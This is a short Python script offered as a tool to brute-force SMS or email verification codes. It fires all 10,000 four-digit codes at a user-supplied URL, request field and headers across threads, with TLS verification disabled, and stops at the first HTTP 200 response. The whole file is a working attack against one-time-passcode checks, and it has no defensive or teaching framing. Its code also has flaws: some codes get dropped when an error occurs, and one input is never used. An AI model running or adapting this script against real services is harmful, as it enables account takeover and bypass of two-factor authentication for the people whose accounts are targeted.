import threading
from queue import Queue
import requests
import json

jobs = Queue()

ToStop = True
NumThread= 10

def do_stuff(q):
    global ToStop, NumThread,Url,Methodee,Type,DataR,DataJ,parmm,KeyParmeter,KeyJson
    while not q.empty():
      try:
        if ToStop == False:
          raise Exception()
        value = q.get()
        if Methodee == "GET":
            parmm[KeyParmeter] = value
            re = requests.get(Url, headers=Headers, params=parmm, verify=False)
        if Type == 1:
            parmm[KeyParmeter] = value
            re = requests.post(Url, headers=Headers, data=parmm, verify=False)
        if Type == 2:
            DataJ[KeyJson] = value
            re = requests.post(Url, headers=Headers, json=DataJ, verify=False)
        if re.status_code == 200:
            ToStop = False
            print("res", re.text, "stsus", re.status_code, "headers", re.headers, "code", value)
        q.task_done()

      except Exception:
        q.get()
        q.task_done()








print("sample tools to brute force sms code or email")
NumThread = int(input("enter num of thread the please enter 10: "))
Url = input("enter the url: ")
Methodee = input("POST Or GET ?: ")
Type = int(input("Type of data : 1 For Text or 2 for Json: "))
if Type == 1:
    parmm = dict()
    print("enter raw data like  with change value for parmeter with 1337 Example : code=1337&userId=1 ")
    DataR = input("Enter data: ")
    for xx in DataR.split("&"):
        parmm.update({xx.split("=")[0]: xx.split("=")[1]})
    KeyParmeter = list(parmm.keys())[list(parmm.values()).index("1337")]
elif Type == 2:
    print('enter JSon data like with change value for parmeter with 1337 Example : {"id":"1", "FORFun":"TRue","otp":"1337"} ')
    DataJ = input("Enter data:")
    DataJ = json.loads(DataJ)
    KeyJson = list(DataJ.keys())[list(DataJ.values()).index("1337")]



print("enter header but [SS] between header like ````User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0[SS]Accept: */*[SS]Accept-Language: en-US,en;q=0.5[SS]Accept-Encoding: gzip, deflate[SS]DNT: 1[SS]Connection: close[SS]Pragma: no-cache[SS]Cache-Control: no-cache````")
HH = input("enter headers: ")
Headers = dict()
for HEad in HH.split("[SS]"):
    Headers.update({("".join(HEad.split(":", 1)).split(" ")[0]): ("".join(HEad.split(":", 1)).split(" ")[1])})
condition = input("200 :")


for i in range(10000):
    jobs.put(f"%04d" % i)

for xx in range(NumThread):
    worker = threading.Thread(target=do_stuff, args=(jobs,))
    worker.setDaemon(True)
    worker.start()

jobs.join()
print("all done")
